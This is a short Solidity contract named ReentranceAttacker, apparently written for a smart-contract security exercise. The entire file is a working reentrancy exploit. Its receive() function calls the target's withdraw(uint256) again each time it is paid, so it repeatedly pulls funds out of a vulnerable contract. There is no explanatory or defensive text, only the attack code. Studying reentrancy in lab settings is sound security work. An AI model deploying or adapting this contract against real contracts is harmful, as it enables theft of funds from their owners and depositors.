// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentranceAttacker {

    address victim;
    uint amount;

    constructor(address target, uint _amount) payable {
        victim = target;
        amount = _amount;
    }

    function withdraw() public {
        (bool success, ) = victim.call(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );
        require(success);
    }

    receive() external payable {
        withdraw();
    }

}